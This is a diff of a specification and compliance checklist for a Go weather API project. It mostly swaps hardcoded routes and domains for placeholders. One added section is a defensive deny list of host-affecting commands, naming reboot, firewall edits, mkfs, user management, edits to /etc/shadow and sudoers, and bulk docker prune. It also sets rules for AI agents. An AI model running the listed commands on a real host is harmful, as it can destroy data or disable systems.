+| `/{admin_path}/server/nodes/settings` | Node identity settings |
+| `/{admin_path}/server/nodes/{node}` | View specific node details |
 
 #### API Endpoints
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/nodes` | GET | List all nodes |
-| `/api/v1/admin/server/nodes/token` | POST | Generate join token |
-| `/api/v1/admin/server/nodes/join` | POST | Join cluster with token |
-| `/api/v1/admin/server/nodes/leave` | POST | Remove this node from cluster |
-| `/api/v1/admin/server/nodes/{node}` | GET | Get node details |
-| `/api/v1/admin/server/nodes/settings` | GET | Get node identity settings |
-| `/api/v1/admin/server/nodes/settings` | PATCH | Update node identity |
+| `/api/{api_version}/{admin_path}/server/nodes` | GET | List all nodes |
+| `/api/{api_version}/{admin_path}/server/nodes/token` | POST | Generate join token |
+| `/api/{api_version}/{admin_path}/server/nodes/join` | POST | Join cluster with token |
+| `/api/{api_version}/{admin_path}/server/nodes/leave` | POST | Remove this node from cluster |
+| `/api/{api_version}/{admin_path}/server/nodes/{node}` | GET | Get node details |
+| `/api/{api_version}/{admin_path}/server/nodes/settings` | GET | Get node identity settings |
+| `/api/{api_version}/{admin_path}/server/nodes/settings` | PATCH | Update node identity |
 
 ### Supported Remote Databases
 
@@ -53848,7 +55865,7 @@ When using remote database, the same tables are created but with appropriate typ
 **Notes:**
 - Only ONE row ever exists (id=1)
 - Created via setup wizard on first run
-- Setup token displayed in console ONCE, used to access `/admin/server/setup`
+- Setup token displayed in console ONCE, used to access `/{admin_path}/server/setup`
 - Admin password and API token created during setup wizard (user must copy)
 
 #### Admin Sessions Table
@@ -53949,13 +55966,13 @@ This is OPTIONAL and only applies when user profiles should be publicly accessib
 
 | URL Pattern | Maps To | API Endpoint |
 |-------------|---------|--------------|
-| `/{username}` | User public profile | `GET /api/v1/users/{username}` |
-| `/{username}/{resource}` | User's resource | `GET /api/v1/users/{username}/{resource}` |
-| `/{username}/{resource}/{item}` | Specific item | `GET /api/v1/users/{username}/{resource}/{item}` |
+| `/{user_name}` | User public profile | `GET /api/{api_version}/users/{user_name}` |
+| `/{user_name}/{resource}` | User's resource | `GET /api/{api_version}/users/{user_name}/{resource}` |
+| `/{user_name}/{resource}/{item}` | Specific item | `GET /api/{api_version}/users/{user_name}/{resource}/{item}` |
 
 **Examples by App Type:**
 
-| App Type | `/{username}` Shows | Sub-routes |
+| App Type | `/{user_name}` Shows | Sub-routes |
 |----------|---------------------|------------|
 | **Linktree clone** | User's link page | `/{user}/analytics` |
 | **GitHub clone** | User profile + repos | `/{user}/{repo}`, `/{user}/{repo}/issues` |
@@ -53966,10 +55983,10 @@ This is OPTIONAL and only applies when user profiles should be publicly accessib
 
 | Endpoint | Method | Auth | Description |
 |----------|--------|------|-------------|
-| `GET /api/v1/users/{username}` | GET | None | Public profile (filtered fields) |
-| `GET /api/v1/users/{username}/repos` | GET | None | User's public repositories |
-| `GET /api/v1/users/{username}/followers` | GET | None | User's followers |
-| `GET /api/v1/users/{username}/following` | GET | None | Users they follow |
+| `GET /api/{api_version}/users/{user_name}` | GET | None | Public profile (filtered fields) |
+| `GET /api/{api_version}/users/{user_name}/repos` | GET | None | User's public repositories |
+| `GET /api/{api_version}/users/{user_name}/followers` | GET | None | User's followers |
+| `GET /api/{api_version}/users/{user_name}/following` | GET | None | Users they follow |
 
 ### Public vs Private Profile Fields
 
@@ -54169,7 +56186,7 @@ Does your app have multiple users?
 
 **Org Profile Example (API Response):**
 ```json
-GET /api/v1/orgs/acme-corp
+GET /api/{api_version}/orgs/acme-corp
 {
     "id": 42,
     "slug": "acme-corp",
@@ -54429,7 +56446,7 @@ func GetOrCreateOrgPreferences(orgID int) (*OrgPreferences, error) {
 
 **Get Org Settings:**
 ```json
-GET /api/v1/orgs/acme-corp/settings
+GET /api/{api_version}/orgs/acme-corp/settings
 {
     "general": {
         "name": "Acme Corporation",
@@ -54484,7 +56501,7 @@ When a private user has `org_visibility: true`, org members can see:
 
 **Private user with org_visibility=true, viewed by org member:**
 ```json
-GET /api/v1/orgs/acme-corp/members/private_user
+GET /api/{api_version}/orgs/acme-corp/members/private_user
 {
     "username": "private_user",
     "display_name": "Private User",
@@ -54499,7 +56516,7 @@ GET /api/v1/orgs/acme-corp/members/private_user
 
 **Private user with org_visibility=true, viewed publicly:**
 ```json
-GET /api/v1/public/users/private_user
+GET /api/{api_version}/public/users/private_user
 {
     "error": "not_found",
     "message": "User not found"
@@ -54509,7 +56526,7 @@ GET /api/v1/public/users/private_user
 
 **Private user with org_visibility=false, viewed by org member:**
 ```json
-GET /api/v1/orgs/acme-corp/members/very_private_user
+GET /api/{api_version}/orgs/acme-corp/members/very_private_user
 {
     "username": "very_private_user",
     "role": "member",
@@ -54596,9 +56613,9 @@ This is OPTIONAL and only applies when org profiles should be publicly accessibl
 
 | URL Pattern | Maps To | API Endpoint |
 |-------------|---------|--------------|
-| `/{orgslug}` | Org public profile | `GET /api/v1/orgs/{slug}` |
-| `/{orgslug}/{resource}` | Org's resource | `GET /api/v1/orgs/{slug}/{resource}` |
-| `/{orgslug}/{resource}/{item}` | Specific item | `GET /api/v1/orgs/{slug}/{resource}/{item}` |
+| `/{orgslug}` | Org public profile | `GET /api/{api_version}/orgs/{slug}` |
+| `/{orgslug}/{resource}` | Org's resource | `GET /api/{api_version}/orgs/{slug}/{resource}` |
+| `/{orgslug}/{resource}/{item}` | Specific item | `GET /api/{api_version}/orgs/{slug}/{resource}/{item}` |
 
 **Examples by App Type:**
 
@@ -54613,10 +56630,10 @@ This is OPTIONAL and only applies when org profiles should be publicly accessibl
 
 | Endpoint | Method | Auth | Description |
 |----------|--------|------|-------------|
-| `GET /api/v1/orgs/{slug}` | GET | None* | Public org profile |
-| `GET /api/v1/orgs/{slug}/repos` | GET | None* | Org's public repositories |
-| `GET /api/v1/orgs/{slug}/members` | GET | None* | Public member list |
-| `GET /api/v1/orgs/{slug}/teams` | GET | Member | Team list (members only) |
+| `GET /api/{api_version}/orgs/{slug}` | GET | None* | Public org profile |
+| `GET /api/{api_version}/orgs/{slug}/repos` | GET | None* | Org's public repositories |
+| `GET /api/{api_version}/orgs/{slug}/members` | GET | None* | Public member list |
+| `GET /api/{api_version}/orgs/{slug}/teams` | GET | Member | Team list (members only) |
 
 *Public orgs only. Private orgs require membership.
 
@@ -55065,46 +57082,46 @@ func CustomDomainMiddleware(resolver *DomainResolver) func(http.Handler) http.Ha
 | `/orgs/{slug}/domains/{domain}/verify` | Trigger verification |
 | `/orgs/{slug}/domains/{domain}/delete` | Delete confirmation |
 
-### Admin Domain Management (`/admin/server/domains/`)
+### Admin Domain Management (`/{admin_path}/server/domains/`)
 
 | Path | Description |
 |------|-------------|
-| `/admin/server/domains` | List all custom domains |
-| `/admin/server/domains/{domain}` | View/manage any domain |
-| `/admin/server/domains/{domain}/suspend` | Suspend domain |
-| `/admin/server/domains/{domain}/unsuspend` | Unsuspend domain |
-| `/admin/server/domains/{domain}/delete` | Force delete domain |
+| `/{admin_path}/server/domains` | List all custom domains |
+| `/{admin_path}/server/domains/{domain}` | View/manage any domain |
+| `/{admin_path}/server/domains/{domain}/suspend` | Suspend domain |
+| `/{admin_path}/server/domains/{domain}/unsuspend` | Unsuspend domain |
+| `/{admin_path}/server/domains/{domain}/delete` | Force delete domain |
 
 ## API Routes
 
-### User Domain API (`/api/v1/users/domains/`)
+### User Domain API (`/api/{api_version}/users/domains/`)
 
 | Route | Method | Description |
 |-------|--------|-------------|
-| `/api/v1/users/domains` | GET | List user's domains |
-| `/api/v1/users/domains` | POST | Add new domain |
-| `/api/v1/users/domains/{domain}` | GET | Get domain details |
-| `/api/v1/users/domains/{domain}` | DELETE | Remove domain |
-| `/api/v1/users/domains/{domain}/verify` | POST | Trigger verification |
-| `/api/v1/users/domains/{domain}/dns` | GET | Get DNS records to configure |
-| `/api/v1/users/domains/{domain}/ssl` | GET | Get SSL status |
-| `/api/v1/users/domains/{domain}/ssl` | POST | Configure SSL (provider + credentials) |
-| `/api/v1/users/domains/{domain}/ssl/renew` | POST | Force SSL renewal |
+| `/api/{api_version}/users/domains` | GET | List user's domains |
+| `/api/{api_version}/users/domains` | POST | Add new domain |
+| `/api/{api_version}/users/domains/{domain}` | GET | Get domain details |
+| `/api/{api_version}/users/domains/{domain}` | DELETE | Remove domain |
+| `/api/{api_version}/users/domains/{domain}/verify` | POST | Trigger verification |
+| `/api/{api_version}/users/domains/{domain}/dns` | GET | Get DNS records to configure |
+| `/api/{api_version}/users/domains/{domain}/ssl` | GET | Get SSL status |
+| `/api/{api_version}/users/domains/{domain}/ssl` | POST | Configure SSL (provider + credentials) |
+| `/api/{api_version}/users/domains/{domain}/ssl/renew` | POST | Force SSL renewal |
 
-### Org Domain API (`/api/v1/orgs/{slug}/domains/`)
+### Org Domain API (`/api/{api_version}/orgs/{slug}/domains/`)
 
 Same routes as user, scoped to organization.
 
-### Admin Domain API (`/api/v1/admin/server/domains/`)
+### Admin Domain API (`/api/{api_version}/{admin_path}/server/domains/`)
 
 | Route | Method | Description |
 |-------|--------|-------------|
-| `/api/v1/admin/server/domains` | GET | List all domains (paginated) |
-| `/api/v1/admin/server/domains/{domain}` | GET | Get any domain details |
-| `/api/v1/admin/server/domains/{domain}` | DELETE | Force delete any domain |
-| `/api/v1/admin/server/domains/{domain}/suspend` | POST | Suspend domain |
-| `/api/v1/admin/server/domains/{domain}/unsuspend` | POST | Unsuspend domain |
-| `/api/v1/admin/server/domains/{domain}/ssl/renew` | POST | Force SSL renewal |
+| `/api/{api_version}/{admin_path}/server/domains` | GET | List all domains (paginated) |
+| `/api/{api_version}/{admin_path}/server/domains/{domain}` | GET | Get any domain details |
+| `/api/{api_version}/{admin_path}/server/domains/{domain}` | DELETE | Force delete any domain |
+| `/api/{api_version}/{admin_path}/server/domains/{domain}/suspend` | POST | Suspend domain |
+| `/api/{api_version}/{admin_path}/server/domains/{domain}/unsuspend` | POST | Unsuspend domain |
+| `/api/{api_version}/{admin_path}/server/domains/{domain}/ssl/renew` | POST | Force SSL renewal |
 
 ## Verification Flow
 
@@ -55113,7 +57130,7 @@ Same routes as user, scoped to organization.
 ### Step 1: User Adds Domain
 
 ```
-POST /api/v1/users/domains
+POST /api/{api_version}/users/domains
 {
   "domain": "api.mycompany.com"
 }
@@ -55151,7 +57168,7 @@ mycompany.com.              300  IN  AAAA   2001:db8::1
 ### Step 3: User Triggers Verification
 
 ```
-POST /api/v1/users/domains/api.mycompany.com/verify
+POST /api/{api_version}/users/domains/api.mycompany.com/verify
 
 Response (success):
 {
@@ -55392,7 +57409,7 @@ func (s *DomainService) selectChallengeType(domain *CustomDomain) string {
 Challenge options: `auto`, `http-01`, `tls-alpn-01`
 
 ```
-POST /api/v1/users/domains/api.mycompany.com/ssl
+POST /api/{api_version}/users/domains/api.mycompany.com/ssl
 {
   "challenge": "auto"
 }
@@ -55419,7 +57436,7 @@ The server handles the ACME TLS-ALPN-01 challenge on port 443. This works behind
 **For wildcards or when HTTP/TLS challenges aren't available:**
 
 ```
-POST /api/v1/users/domains/api.mycompany.com/ssl
+POST /api/{api_version}/users/domains/api.mycompany.com/ssl
 {
   "challenge": "dns-01",
   "provider": "cloudflare",
@@ -55542,7 +57559,7 @@ server:
 
 **Public IP in /healthz:**
 
-The discovered public IPs are safe to include in `/healthz` - same info anyone can get with `dig wthr.top`.
+The discovered public IPs are safe to include in `/healthz` - same info anyone can get with `dig {fqdn}`.
 - IPv4: From external lookup (needed for containers/NAT)
 - IPv6: From local interface if global unicast address exists
 
@@ -55693,7 +57710,7 @@ When implementing custom domains for a project:
 - [ ] Create database tables (custom_domains, custom_domain_records, custom_domain_audit)
 - [ ] Implement domain resolver middleware
 - [ ] Create user web routes (/users/domains/*)
-- [ ] Create user API routes (/api/v1/users/domains/*)
+- [ ] Create user API routes (/api/{api_version}/users/domains/*)
 - [ ] Create org web/API routes (if orgs supported)
 - [ ] Create admin management routes
 - [ ] Implement DNS verification
@@ -56008,7 +58025,7 @@ A weather aggregation API that fetches data from external providers, caches it, 
 - [ ] No external runtime dependencies - everything embedded
 - [ ] Use ONLY approved libraries (see PART 5)
 - [ ] Follow exact config paths: `server.xxx`, not variations
-- [ ] Follow exact route patterns: `/api/v1/admin/server/xxx`
+- [ ] Follow exact route patterns: `/api/{api_version}/{admin_path}/server/xxx`
 - [ ] Token prefixes: `adm_` (admin), `usr_` (user), `org_` (org)
 - [ ] Setup token: 32 hex chars, no dashes
 
@@ -56078,9 +58095,9 @@ GOCACHE := $(HOME)/.local/share/go/build  # Local machine path for build cache
 | NEVER | ALWAYS |
 |-------|--------|
 | `docker compose up` in project dir | Use temp directory workflow |
-| Runtime data in project directory | `/tmp/apimgr/weather-XXXXXX/` |
+| Runtime data in project directory | `/tmp/apimgr/{internal_name}-XXXXXX/` |
 | `mktemp -d` (bare) | `mktemp -d "${TMPDIR:-/tmp}/$APIMGR/$WEATHER-XXXXXX"` |
-| `/tmp/myfile` | `/tmp/apimgr/weather-XXXXXX/myfile` |
+| `/tmp/myfile` | `/tmp/apimgr/{internal_name}-XXXXXX/myfile` |
 
 ```bash
 # Temp dir workflow
@@ -56263,7 +58280,7 @@ make docker # Build Docker image
 
 **PART 13: Health & Versioning**
 - [ ] `/healthz` endpoint exists (frontend - smart detection)
-- [ ] `/api/v1/healthz` endpoint exists (API - supports .txt)
+- [ ] `/api/{api_version}/healthz` endpoint exists (API - supports .txt)
 - [ ] Returns 200 OK when healthy
 - [ ] Smart detection: browser → HTML, CLI → formatted text
 - [ ] Extended healthz response includes:
@@ -56280,7 +58297,7 @@ make docker # Build Docker image
 - [ ] `--status` flag returns exit 0 (healthy) or 1 (unhealthy)
 
 **PART 14: API Structure**
-- [ ] REST API at `/api/v1/`
+- [ ] REST API at `/api/{api_version}/`
 - [ ] Consistent response format
 - [ ] Proper HTTP status codes
 - [ ] Pagination for list endpoints
@@ -56323,8 +58340,8 @@ make docker # Build Docker image
 ### Phase 6: Admin & Email (PARTS 17-18)
 
 **PART 17: Admin Panel**
-- [ ] Admin UI at `/admin`
-- [ ] Admin API at `/api/v1/admin/`
+- [ ] Admin UI at `/{admin_path}`
+- [ ] Admin API at `/api/{api_version}/{admin_path}/`
 - [ ] First-run setup wizard
 - [ ] All settings configurable via UI
 - [ ] Settings organized by category
@@ -56488,7 +58505,7 @@ make docker # Build Docker image
 - [ ] Tor status in admin panel
 - [ ] Tor config in `{config_dir}/tor/torrc`
 - [ ] Tor data in `{data_dir}/tor/`
-- [ ] Tor fields in `/api/v1/healthz`:
+- [ ] Tor fields in `/api/{api_version}/healthz`:
   - [ ] `features.tor.enabled` (yes/no)
   - [ ] `features.tor.running` (yes/no)
   - [ ] `features.tor.status` (healthy/error:{message})
@@ -56523,7 +58540,7 @@ make docker # Build Docker image
 - [ ] Same version as server
 - [ ] CLI mode (standard commands)
 - [ ] TUI mode (interactive)
-- [ ] Config: `~/.config/apimgr/weather/cli.yml`
+- [ ] Config: `~/.config/apimgr/{internal_name}/cli.yml`
 - [ ] Theme matching server (dark default)
 - [ ] Shell completions (bash, zsh, fish, powershell)
 - [ ] All server API operations accessible via CLI
@@ -56539,7 +58556,7 @@ make docker # Build Docker image
 - [ ] Runs directly on system, NOT in container
 - [ ] Same version as server
 - [ ] Systemd/launchd/Windows service support
-- [ ] Config: `/etc/apimgr/weather/agent.yml`
+- [ ] Config: `/etc/apimgr/{internal_name}/agent.yml`
 - [ ] Connects to central server
 - [ ] Same flags as server EXCEPT no `--port`/`--address` (agents don't serve HTTP)
 - [ ] Communication pattern documented:
@@ -56571,7 +58588,7 @@ make docker # Build Docker image
 - [ ] Passwords hashed with Argon2id (NEVER bcrypt)
 - [ ] Session tokens are cryptographically random
 - [ ] Session expiration enforced
-- [ ] CSRF protection on all forms
+- [ ] CSRF protection on cookie-authenticated browser forms (Bearer/API-token requests, public endpoints, and `csrf.exempt_paths` correctly bypassed — see PART 16)
 - [ ] API authentication on all protected endpoints
 - [ ] Rate limiting prevents brute force
 - [ ] Account lockout after failed attempts
@@ -56641,7 +58658,7 @@ make docker # Build Docker image
 - [ ] Server admins in separate table (`admins`)
 - [ ] Regular users in separate table (`users`)
 - [ ] Separate session tables (`admin_sessions`, `user_sessions`)
-- [ ] Admin routes protected (`/admin/*`)
+- [ ] Admin routes protected (`/{admin_path}/*`)
 - [ ] No privilege escalation path from user to admin
 
 ---
@@ -56696,20 +58713,20 @@ make docker # Build Docker image
 
 ### Route Compliance (MANDATORY)
 
-- [ ] ALL API routes are versioned (`/api/v1/...`)
+- [ ] ALL API routes are versioned (`/api/{api_version}/...`)
 - [ ] ALL resource names are plural (`users`, not `user`)
 - [ ] ALL routes are lowercase
 - [ ] Multi-word routes use hyphens (`api-keys`, not `api_keys`)
 - [ ] No trailing slashes on routes
 - [ ] No verbs in routes (use HTTP methods)
 - [ ] Every API route has corresponding frontend route
-- [ ] Frontend routes match API structure (`/users` ↔ `/api/v1/users`)
+- [ ] Frontend routes match API structure (`/users` ↔ `/api/{api_version}/users`)
 - [ ] Frontend is fully functional (not just display)
 - [ ] All CRUD operations work from both frontend and API
 - [ ] No orphan routes (frontend-only or API-only)
 - [ ] Routes follow scope rules (`/auth/`, `/users/`, `/orgs/`, `/admin/`)
 
-### REST API (`/api/v1/`)
+### REST API (`/api/{api_version}/`)
 
 - [ ] Consistent URL patterns
 - [ ] Proper HTTP methods (GET, POST, PUT, PATCH, DELETE)
@@ -56721,20 +58738,20 @@ make docker # Build Docker image
 - [ ] Sorting: sort, order parameters
 - [ ] HATEOAS links (optional but recommended)
 
-### OpenAPI/Swagger (`/openapi`)
+### OpenAPI/Swagger (`/server/docs/swagger`)
 
-- [ ] Swagger UI accessible
-- [ ] OpenAPI spec at `/openapi.json`
+- [ ] Swagger UI accessible at `/server/docs/swagger`
+- [ ] OpenAPI spec at `/api/{api_version}/openapi.json` (versioned) AND `/api/openapi.json` (current version, served directly — no redirect)
 - [ ] All endpoints documented
 - [ ] Request/response schemas defined
 - [ ] Authentication documented
 - [ ] Examples provided
 - [ ] Theme matches project theme
 
-### GraphQL (`/graphql`)
+### GraphQL (`/server/docs/graphql` UI, `/api/graphql` endpoint)
 
-- [ ] GraphQL endpoint accessible
-- [ ] GraphiQL/Playground available
+- [ ] GraphQL endpoint accessible at `/api/{api_version}/graphql` (versioned) AND `/api/graphql` (current version, served directly — no redirect)
+- [ ] GraphiQL/Playground available at `/server/docs/graphql`
 - [ ] Schema matches REST API capabilities
 - [ ] Authentication integrated
 - [ ] Query complexity limits
@@ -56799,7 +58816,7 @@ make docker # Build Docker image
 - [ ] Homepage included with priority 1.0
 - [ ] Public pages included with appropriate priority
 - [ ] Documentation pages included
-- [ ] API docs (`/openapi`, `/graphql`) included
+- [ ] API docs (`/server/docs/swagger`, `/server/docs/graphql`) included
 - [ ] User profiles included ONLY if public
 - [ ] Admin pages (`/admin/*`) NEVER included
 - [ ] Auth pages (`/auth/*`) NEVER included
@@ -57017,7 +59034,7 @@ make docker # Build Docker image
 - [ ] Stored as SHA-256 hash in `{config_dir}/setup_token.txt`
 - [ ] Plaintext token shown ONCE in console banner
 - [ ] File deleted after successful setup completion
-- [ ] Setup URL displayed: `{proto}://wthr.top/admin/server/setup`
+- [ ] Setup URL displayed: `{proto}://{fqdn}/{admin_path}/server/setup`
 - [ ] Token section only appears on first run (never again after setup)
 
 ### CLI Flag Syntax (ALL Binaries)
@@ -57048,8 +59065,8 @@ make docker # Build Docker image
 ### Banner Placeholders (Must Be Defined)
 
 - [ ] `{proto}` - Protocol (http/https)
-- [ ] `wthr.top` - Fully qualified domain name
-- [ ] `/` - URL path prefix (auto-detected from reverse proxy)
+- [ ] `{fqdn}` - Fully qualified domain name
+- [ ] `{base_url}` - URL path prefix (auto-detected from reverse proxy)
 - [ ] `{port}` - Port number (stripped if 80/443)
 - [ ] `{address}` - Listen IP address
 - [ ] `{app_mode}` - Application mode (production/development)
@@ -57060,7 +59077,7 @@ make docker # Build Docker image
 - [ ] `{startup_datetime}` - Server start timestamp
 - [ ] `{setup_token}` - First-run setup token (shown ONCE)
 - [ ] `WEATHER` - Project name (uppercase for display)
-- [ ] `1.0.0` - Current version
+- [ ] `{project_version}` - Current version
 
 ### Client TUI/GUI Dynamic Sizing
 
@@ -57163,6 +59180,49 @@ make docker # Build Docker image
 - [ ] GraphQL: type/field descriptions translated
 - [ ] Startup banners: all label text translated (Mode, Server, Listening, etc.)
 - [ ] Setup wizard: all steps, labels, prompts translated
+
+## HOST SYSTEM SAFETY CHECKLIST
+
+### Forbidden on Host (Verify No Such Calls in Tests/Scripts/Docs)
+
+- [ ] No `reboot`, `shutdown`, `poweroff`, `halt`, `init 0`, `init 6` invoked on host
+- [ ] No `systemctl start/stop/restart/enable/disable` of host services in test scripts
+- [ ] No `service`, `rc-service`, `launchctl`, `sc.exe` lifecycle calls against host
+- [ ] No `ip link/addr/route` writes, `ifconfig`, `ifup/ifdown`, `nmcli`, `networkctl`, `wg-quick` on host
+- [ ] No `iptables`, `ip6tables`, `nft`, `ufw`, `firewall-cmd`, `pfctl`, `netsh advfirewall` on host
+- [ ] No `modprobe`, `rmmod`, `insmod`, persistent `sysctl -w`, writes to `/proc/sys/`, `/sys/` on host
+- [ ] No `mount`, `umount`, `mkfs.*`, `fdisk`, `parted`, `swapon/swapoff`, `cryptsetup`, `lvcreate`, `zpool/zfs` on host
+- [ ] No `useradd/userdel/usermod`, `groupadd/groupdel`, `passwd`, edits to `/etc/passwd`, `/etc/shadow`, `/etc/sudoers*` on host
+- [ ] No `apt`, `dnf`, `yum`, `pacman`, `apk`, `brew`, `pip --system`, `npm -g`, `cargo install` on host
+- [ ] No `date -s`, `timedatectl set-time`, `hwclock --systohc`, `ntpdate` on host
+- [ ] No edits to `/etc/fstab`, `/etc/hosts`, `/etc/resolv.conf`, `/etc/network/*`, `/etc/systemd/system/*`, `/etc/ssh/sshd_config`, `/boot/*`, `/etc/grub*` on host
+
+### Allowed Contexts Are Explicit
+
+- [ ] All forbidden-category commands in test scripts are wrapped in `docker exec`, `docker run`, `incus exec`, `lxc exec`, `podman exec`, `virsh`, `vagrant ssh -c`, `multipass exec`, `chroot`, or `ip netns exec`
+- [ ] Test container/instance names follow `test-weather` pattern so they are clearly disposable
+- [ ] No test or debug script assumes "I'm in a container" without checking — `/.dockerenv`, `/run/.containerenv`, `/proc/1/cgroup`, `systemd-detect-virt`, or `$container` is consulted before any host-affecting command
+- [ ] When detection is ambiguous, scripts default to refusing the host-affecting command
+
+### Process & Container Cleanup (Cross-Reference with Process Management)
+
+- [ ] No `pkill -f`, `pkill` without `-x`, `killall`, `kill -9` as first action
+- [ ] No `docker rm $(docker ps -aq)`, `docker system prune`, `docker container prune`, `docker volume prune`, `docker network prune`
+- [ ] No `incus delete --force` of an instance not created by the current test
+- [ ] All cleanup targets the SPECIFIC container/instance/PID created by the current task
+
+### Documentation & Examples
+
+- [ ] All shell examples in docs that show forbidden commands either run inside a container/VM or carry an explicit "Run on the host yourself — not by AI" note
+- [ ] CI workflows that touch host state run on ephemeral runners only (never long-lived, never on developer machines)
+- [ ] Refusal message text from the Host System Safety Rule is internalized — AI does not silently rewrite forbidden commands as host commands
+
+### Behavioral Audit (AI Itself)
+
+- [ ] AI refuses host-affecting commands and offers a container/VM equivalent instead of silently executing
+- [ ] AI never claims "this is fine, it's just a test" as a justification to bypass the rule
+- [ ] AI never edits a script to run a forbidden command on the host because "the user can review the diff"
+- [ ] AI asks the user to perform the action themselves when no container/VM context fits
 
 ---
 
@@ -57269,7 +59329,7 @@ After each significant change:
 
 **If project has existing API that doesn't match spec:**
 
-1. Implement new spec-compliant API at `/api/v1/`
+1. Implement new spec-compliant API at `/api/{api_version}/`
 2. **DELETE old endpoints** - no deprecation periods, no shims
 3. Document breaking changes clearly in release notes
 4. Provide one-time migration script if data format changed
@@ -57484,7 +59544,7 @@ When bootstrapping a new project from this specification:
 
 1. **Initialize Go module:**
    ```bash
-   go mod init github.com/apimgr/weather
+   go mod init github.com/apimgr/{internal_name}
    ```
 
 2. **Create src/main.go** - Minimal entry point
@@ -57636,8 +59696,10 @@ Implement as needed for your project:
 - [ ] Admin panel accessible
 - [ ] First-run setup wizard works
 - [ ] REST API endpoints defined
-- [ ] Swagger UI accessible at /openapi
-- [ ] GraphQL accessible at /graphql
+- [ ] Swagger UI accessible at /server/docs/swagger
+- [ ] OpenAPI spec accessible at /api/{api_version}/openapi.json AND /api/openapi.json
+- [ ] GraphiQL accessible at /server/docs/graphql
+- [ ] GraphQL endpoint accessible at /api/{api_version}/graphql AND /api/graphql
 - [ ] All three APIs in sync
 
 ### Infrastructure
